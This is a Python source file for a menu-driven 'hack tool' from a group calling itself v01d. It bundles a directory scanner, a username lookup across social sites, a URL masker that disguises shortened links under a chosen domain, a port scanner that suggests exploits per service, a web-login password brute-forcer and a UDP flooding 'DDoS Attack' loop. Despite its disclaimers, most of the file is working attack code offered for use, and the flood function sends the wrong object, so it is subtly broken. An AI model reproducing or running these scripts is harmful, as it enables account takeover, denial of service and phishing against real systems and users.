# ============================================================
#  V01D Hack Tool - Educational Security Testing Scripts
#
#  ⚠️ DISCLAIMER:
#  This tool is intended for EDUCATIONAL and RESEARCH purposes only.
#  Unauthorized use against systems you do not own or have explicit 
#  permission to test is ILLEGAL and strictly prohibited.
#
#  Features:
#   - Brute force attempts
#   - Port scanning
#   - Directory scanning
#   - Web information gathering
#   - (Experimental) traffic testing module
#
#  Use this tool ONLY on your own systems or in environments 
#  where you have explicit authorization.
# ============================================================

import os
import time
import requests
from colorama import init, Fore, Style
import sys
import pyshorteners
from urllib.parse import urlparse, urljoin
import re
import pyfiglet
import socket
import datetime
import ssl
import subprocess
from pyfiglet import Figlet
import threading
from queue import Queue
import random
from bs4 import BeautifulSoup

RESET = Style.RESET_ALL
init(autoreset=True)
os.system("clear")

# -------------------- DIRECTORY SCANNER --------------------
num_threads = 10
q = Queue()

def worker():
    while True:
        full_url = q.get()
        if full_url is None:
            break
        try:
            r = requests.get(full_url, timeout=5)
            status = r.status_code
            if status == 200:
                print(Fore.GREEN + f"[+] Found: {full_url}")
            elif status == 403:
                print(Fore.MAGENTA + f"[!] Access Denied (403): {full_url}")
            elif status == 401:
                print(Fore.LIGHTRED_EX + f"[!] Authorization Required (401): {full_url}")
            elif status == 500:
                print(Fore.RED + f"[!] Server Error (500): {full_url}")
            else:
                print(Fore.LIGHTBLACK_EX + f"[-] {full_url} --> {status}")
        except requests.Timeout:
            print(Fore.RED + f"[!] Timeout: {full_url}")
        except requests.ConnectionError:
            print(Fore.RED + f"[!] Connection Error: {full_url}")
        except requests.RequestException as e:
            print(Fore.RED + f"[X] Request Error ({full_url}): {e}")
        finally:
            q.task_done()

def dir_buster():
    ascii_art = pyfiglet.figlet_format("v01dBuster", font="standard")
    print(Fore.LIGHTGREEN_EX + ascii_art)
    print("!!!PLEASE USE ONLY ON YOUR OWN LAB or SYSTEMS!!! ")
    
    base_url = input(Fore.CYAN + "\n[?] Enter the site URL (e.g., https://target.com): ").strip()
    if not base_url.startswith("http"):
        print(Fore.RED + "[X] URL must start with 'http://' or 'https://'!")
        return

    wordlist_path = input(Fore.CYAN + "[?] Enter the path to your directory wordlist: ").strip()
    try:
        with open(wordlist_path, "r") as f:
            dirs = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[X] File not found: {wordlist_path}")
        return

    print(Fore.YELLOW + f"\n[!] Starting directory scan with {num_threads} threads...\n")

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    for d in dirs:
        full_url = urljoin(base_url, d)
        q.put(full_url)

    q.join()

    for _ in range(num_threads):
        q.put(None)
    for t in threads:
        t.join()

    print(Fore.GREEN + "\n[+] Scan completed.")

# -------------------- USER SCAN --------------------
def user_scan(username):
    try:
        results = {}
        social_media = [
            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
            {"url": "https://www.youtube.com/{}", "name": "Youtube"},
            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
            {"url": "https://www.medium.com/@{}", "name": "Medium"},
            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
            {"url": "https://www.behance.net/{}", "name": "Behance"}
        ]

        print(f"\n{Fore.CYAN}Scanning for username: {username}...")
        for site in social_media:
            url = site['url'].format(username)
            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    results[site['name']] = url
                    print(f"{Fore.MAGENTA}[+] {site['name']}: {Fore.GREEN}{url}")
                else:
                    results[site['name']] = f"{Fore.YELLOW}Username not found!"
                    print(f"{Fore.MAGENTA}[-] {site['name']}: {Fore.YELLOW}Username not found!")
            except requests.RequestException:
                results[site['name']] = f"{Fore.RED}Error connecting!"
                print(f"{Fore.MAGENTA}[-] {site['name']}: {Fore.RED}Error connecting!")

    except Exception as e:
        print(f"{Fore.RED}Error: {e}")
        return

    filename = f"{username}_scan_results.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"Social scan results for username: {username}\n\n")
        for site, url in results.items():
            f.write(f"{site}: {url}\n")
    print(f"\n{Fore.CYAN}[+] Scan complete! Results saved to {filename}")


# -------------------- URL MASKER --------------------
def url_masker():
    print(f"\n{Fore.CYAN}=== URL MASKER ===\n")
    s = pyshorteners.Shortener()
    short_list = [s.tinyurl, s.clckru]

    while True:
        user_url = input(f"{Fore.GREEN}Enter the URL: {RESET}")
        if re.match(r'^(https?://)?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(/.*)?$', user_url):
            if not user_url.startswith("http"):
                user_url = "http://" + user_url
            break
        print(f"{Fore.RED}Invalid URL format!{RESET}")

    while True:
        custom_dom = input(f"{Fore.YELLOW}Enter your custom domain: {RESET}")
        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', custom_dom):
            break
        print(f"{Fore.RED}Invalid domain!{RESET}")

    while True:
        tag = input(f"{Fore.YELLOW}Enter a keyword (max 15 chars): {RESET}")
        if " " not in tag and len(tag) <= 15:
            break
        print(f"{Fore.RED}Invalid keyword!{RESET}")

    def safe_mask_url(domain, tag, url):
        parsed = urlparse(url)
        return f"https://{domain}/{tag}/{parsed.netloc}{parsed.path}"

    results = []
    for idx, sh in enumerate(short_list):
        try:
            short_url = sh.short(user_url)
            transformed = safe_mask_url(custom_dom, tag, short_url)
            results.append(transformed)
        except Exception as e:
            print(f"{Fore.RED}Shortener {sh.__name__} failed: {e}{RESET}")
            continue

    print(f"\n{Fore.CYAN}Original URL: {RESET}{user_url}\n")
    print(f"{Fore.MAGENTA}Transformed URLs:")
    for i, u in enumerate(results):
        print(f"{Fore.GREEN}╰➤ {RESET}{u}")


# -------------------- PORT SCANNER --------------------
COLORS = {"red": "\033[91m","green": "\033[92m","yellow": "\033[93m","blue": "\033[94m","magenta": "\033[95m","cyan": "\033[96m","reset": "\033[0m"}
def colored_print(text, color): return f"{COLORS.get(color, '')}{text}{COLORS['reset']}"

def service_name(port):
    port_service_map = {21:"ftp",22:"ssh",23:"telnet",25:"smtp",53:"dns",80:"http",110:"pop3",143:"imap",443:"https",3306:"mysql",3389:"rdp",8080:"http-alt",5900:"vnc",139:"netbios",445:"smb"}
    return port_service_map.get(port, "Unknown")

def recommend_exploit(service):
    exploits = {"ftp":"vsftpd 2.3.4 backdoor, Anonymous Login, Brute Force","ssh":"Brute Force (Hydra), CVE-2018-15473 User Enumeration",
        "telnet":"Default Credentials, CVE-2017-0144 EternalBlue","http":"Dirb, Nikto, XSS, SQLi, LFI/RFI","https":"Heartbleed CVE-2014-0160, SSL POODLE",
        "mysql":"CVE-2012-2122 (Auth Bypass), Brute Force","rdp":"BlueKeep CVE-2019-0708, NLA Bypass","smtp":"Open Relay, User Enum via VRFY",
        "pop3":"Cleartext Login, POP3 Buffer Overflow Exploits","imap":"IMAP Login Bruteforce, CVE-2020-11849","smb":"EternalBlue (CVE-2017-0144), Null Session, smbclient",
        "netbios":"NetBIOS Name Service Poisoning, nbtscan","vnc":"Unauthenticated Access, VNC bruteforce","http-alt":"Webshell Upload, Directory Traversal on alternate port"}
    return exploits.get(service.lower(), "No known exploit recommendations.")

def get_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(2)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode(errors='ignore').strip()
        sock.close()
        return banner if banner else "Version info not available"
    except Exception:
        return "Version info not available"

def run_portscanner():
    print(colored_print(pyfiglet.figlet_format("v01dMap", font="standard"), "cyan"))
    print("!!!PLEASE USE ONLY ON YOUR OWN LAB or SYSTEMS!!! ")
    target_ip = input(colored_print("\nEnter the target IP address: ", "blue")).strip()
    start_port_input = input(colored_print("Start port (can be left blank): ", "blue")).strip()
    end_port_input = input(colored_print("End port (can be left blank): ", "blue")).strip()
    range_ports = []
    if start_port_input and end_port_input:
        try:
            start_port = int(start_port_input)
            end_port = int(end_port_input)
            range_ports = list(range(start_port, end_port + 1))
        except ValueError:
            print(colored_print("Invalid port range.", "red"))
    specific_ports_input = input(colored_print("Enter specific ports separated by commas (e.g., 21,22,80): ", "blue")).strip()
    specific_ports = []
    if specific_ports_input:
        try:
            specific_ports = [int(p.strip()) for p in specific_ports_input.split(",") if p.strip().isdigit()]
        except ValueError:
            print(colored_print("Invalid specific ports format.", "red"))
    port_list = sorted(set(range_ports + specific_ports))
    if not port_list:
        print(colored_print("No ports specified. Scan canceled.", "red"))
        return
    file_name = f"scan_result_{target_ip.replace('.', '_')}.txt"
    with open(file_name, "w") as file:
        print(colored_print("-" * 50, "yellow"))
        print(colored_print(f"Starting scan for: {target_ip}", "green"))
        print(colored_print(f"Scanning ports: {', '.join(map(str, port_list))}", "green"))
        print(colored_print(f"Date & Time: {datetime.datetime.now()}", "green"))
        print(colored_print("-" * 50, "yellow"))
        file.write(f"Port Scan Results - {target_ip}\n")
        file.write(f"Date & Time: {datetime.datetime.now()}\n")
        file.write(f"Scanned Ports: {', '.join(map(str, port_list))}\n")
        file.write("-" * 40 + "\n")
        for port in port_list:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                service = service_name(port)
                info = f"Port {port} OPEN - Service: {service}"
                print(colored_print(info, "red"))
                file.write(info + "\n")
                version = get_banner(target_ip, port)
                print(colored_print(f"  > Service Version: {version}", "magenta"))
                file.write(f"  > Service Version: {version}\n")
                exploit = recommend_exploit(service)
                print(colored_print(f"  > Exploit Recommendation: {exploit}", "cyan"))
                file.write(f"  > Exploit Recommendation: {exploit}\n")
            sock.close()
        print(colored_print("-" * 50, "yellow"))
        print(colored_print(f"Scan completed. Results saved to '{file_name}' file.", "green"))
        print(colored_print("-" * 50, "yellow"))
        file.write("-" * 40 + "\nScan completed.\n")


# -------------------- WEBINFO --------------------
def webinfo():
    f = Figlet(font='slant')
    print(Fore.GREEN + f.renderText("WhoWeb") + Style.RESET_ALL)
    print(Fore.GREEN + "OSINT TERMINAL v01d - IP Based\n" + Style.RESET_ALL)
    target_ip = input(Fore.YELLOW + "Target IP: " + Style.RESET_ALL).strip()
    if not target_ip:
        print(Fore.RED + "IP cannot be empty!" + Style.RESET_ALL)
        return
    output_file = f"{target_ip}_osint.txt"
    with open(output_file, "w", encoding="utf-8") as f_out:
        print(Fore.MAGENTA + f"[~] Starting OSINT collection for {target_ip}...\n" + Style.RESET_ALL)
        print(Fore.CYAN + "== Whois IP ==" + Style.RESET_ALL)
        try:
            whois_info = subprocess.getoutput(f"whois {target_ip}")
        except Exception as e:
            whois_info = f"Error: {e}"
        print(whois_info)
        f_out.write("== Whois IP ==\n" + whois_info + "\n\n")
        print(Fore.CYAN + "== Reverse DNS ==" + Style.RESET_ALL)
        try:
            rev_dns = socket.gethostbyaddr(target_ip)[0]
        except Exception:
            rev_dns = "Not available"
        print(rev_dns)
        f_out.write("== Reverse DNS ==\n" + rev_dns + "\n\n")
        print(Fore.CYAN + "== HTTP Header ==" + Style.RESET_ALL)
        try:
            headers = requests.get(f"http://{target_ip}", timeout=5).headers
            headers_str = "\n".join(f"{k}: {v}" for k, v in headers.items())
        except Exception as e:
            headers_str = f"Error: {e}"
        print(headers_str)
        f_out.write("== HTTP Header ==\n" + headers_str + "\n\n")
        print(Fore.CYAN + "== SSL Certificate ==" + Style.RESET_ALL)
        ssl_info = ""
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=target_ip) as s:
                s.settimeout(5)
                s.connect((target_ip, 443))
                cert = s.getpeercert()
                ssl_info = f"NotBefore: {cert.get('notBefore', '')}\nNotAfter: {cert.get('notAfter', '')}"
        except Exception as e:
            ssl_info = f"Error: {e}"
        print(ssl_info)
        f_out.write("== SSL Certificate ==\n" + ssl_info + "\n\n")
    print(Fore.GREEN + "[+] OSINT collection completed." + Style.RESET_ALL)
    print(Fore.GREEN + f"[+] Results saved: {output_file}" + Style.RESET_ALL)

# -----------------------Brute Force Attack----------------
def slow_print(text, delay=0.02):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def bruteforce():
    ascii_banner = pyfiglet.figlet_format("V01dForce")
    print(Fore.CYAN + ascii_banner)
    
    print("!!!PLEASE USE ONLY ON YOUR OWN LAB or SYSTEMS!!! ")

    url = input(Fore.YELLOW + "\nEnter the target URL>>> ").strip()
    username = input(Fore.YELLOW + "Enter the username to brute force: ").strip()
    wordlist_path = input(Fore.YELLOW + "Enter the path to your password wordlist: ").strip()

    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + f"[!] File not found: {wordlist_path}")
        return

    # Form alanlarını otomatik algılama
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find("form")
        form_fields = {}
        if form:
            for inp in form.find_all("input"):
                name = inp.get("name")
                if name:
                    form_fields[name] = ""
        # Eğer algılanmazsa default olarak 'username' ve 'password' kullan
        if not form_fields:
            form_fields = {"username": "", "password": ""}
    except Exception:
        form_fields = {"username": "", "password": ""}

    # İlk alan username, ikinci password olarak ayarlayalım
    keys = list(form_fields.keys())
    if len(keys) < 2:
        keys = ["username", "password"]

    slow_print(Fore.MAGENTA + f"[INFO] Starting brute force on {url} with username '{username}'\n")

    for password in passwords:
        data = form_fields.copy()
        data[keys[0]] = username
        data[keys[1]] = password
        try:
            response = requests.post(url, data=data, timeout=5)
        except requests.exceptions.RequestException as e:
            print(Fore.RED + f"[!] Request error: {e}")
            continue

        # Başarı veya başarısızlığı otomatik kontrol
        if response.url != url or "welcome" in response.text.lower():
            print(Fore.GREEN + f"[+] Success! Username: {username} | Password: {password}")
            return username, password
        elif "invalid" in response.text.lower() or "wrong" in response.text.lower():
            print(Fore.YELLOW + f"[-] Wrong: {username}:{password}")
        else:
            print(Fore.LIGHTBLACK_EX + f"[~] Tried: {username}:{password}")

    print(Fore.RED + "[-] No valid pass found.")
    return None, None
    
# ---------------------DDoS Attack----------------
def ddos():
	now = datetime.datetime.now()
	hour = now.hour
	minute = now.minute
	day = now.day
	month = now.month
	year = now.year

	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	byte = random._urandom(1490)

	os.system("clear")
	os.system("pyfiglet v01d-AttaX")
	
	print("!!!PLEASE USE ONLY ON YOUR OWN LAB or SYSTEMS!!! ")

# Python3 uyumlu input
	ip = input("IP Target : ")
	port = int(input("Port       : "))
	
	os.system("clear")
	os.system("pyfiglet v01d-AttaX")
	print("DDoS Attack Starting...")
	time.sleep(3)
	sent = 0
	while True:
	    sock.sendto(bytes, (ip, port))
	    sent += 1
	    port += 1
	    print("Sent {} packet to {} throught port:{}".format(sent, ip, port))
	    if port == 65534:
	        port = 1

def menu():
    print(Fore.WHITE + """
==========================================================================
db       db .d88b.  d88b    d8888b   d8   8b      db      .o88b.  88    8Y
 88     88 .8P  Y8.  `88    88   88  88   88     8888    d8P  Y8  88   8P
  88   88  88    88   88    88    88 8888888    88  88   8P       88888B
   88 88.  88    88   88    88    88 88   88   88oooo88  8b       8Y  88
    ys8    `8b  d8'  .88.   88   88  88   88  88      88 Y8b  d8  88   d8
     Y      `Y88P' Y888888P Y8888P   Y8   8P d8        8b `Y88P'  88    b8
==========================================================================
""" + RESET)
    print(Fore.YELLOW + "Coded By: v01d")
    print(Fore.YELLOW + "!!!Please do not use it for illegal activities!!!")
    print(Fore.YELLOW + "I (v01d team) am not responsible for any legal issues.")
    print(Style.DIM + Fore.GREEN + "\nInstagram: @v01dhackteam")
    print(Style.DIM + Fore.GREEN + "Telegram: https://t.me/v01d_hackers")
    print("""
[01]		Passive Web Info
[02]		Directory Scanner
[03]		User Scanner
[04]		URL Masker
[05]		Port Scanner
[06]		Brute Force Attack
[07]		DDoS Attack

[99]		Exit
""")
    islem = input("v01d@tool ~# ")

    if islem == '1':
        webinfo()
    elif islem == '2':
        dir_buster()
    elif islem == '3':
        user = input(Fore.MAGENTA + "Enter username to scan: " + Style.RESET_ALL)
        user_scan(user)
    elif islem == '4':
        url_masker()
    elif islem == '5':
        run_portscanner()
    elif islem == '6':
    	bruteforce()
    elif islem == '7':
    	ddos()
    elif islem == '99':
        print("Exiting...")
        sys.exit()
    else:
        print("Invalid option!")
        
# -------------------- MAIN --------------------
if __name__ == "__main__":
    while True:
        try:
            menu()
            input(f"\n{Fore.MAGENTA}[+] Press Enter to continue...")
            os.system("clear")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Exiting...")
            break
